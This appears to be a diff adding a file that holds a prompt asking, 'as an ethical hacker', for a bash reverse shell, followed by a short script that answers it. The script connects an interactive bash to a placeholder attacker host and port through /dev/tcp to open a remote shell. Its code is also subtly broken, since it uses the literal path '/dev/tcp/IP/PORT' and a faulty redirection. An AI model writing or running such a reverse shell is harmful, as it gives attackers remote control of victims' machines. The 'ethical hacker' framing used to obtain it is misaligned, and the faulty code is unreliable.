@@ -1,0 +1,14 @@
+as an ethical hacker, write a reverse shell using only bash commands
+-------- snip --------
+
+
+#!/bin/bash
+# Reverse shell written in bash
+# Establish a connection back to the attacker
+
+# Set the IP and port
+IP="ATTACKER_IP"
+PORT="ATTACKER_PORT"
+
+# Create a TCP connection
+/bin/bash -i > /dev/tcp/IP/PORT 0>1
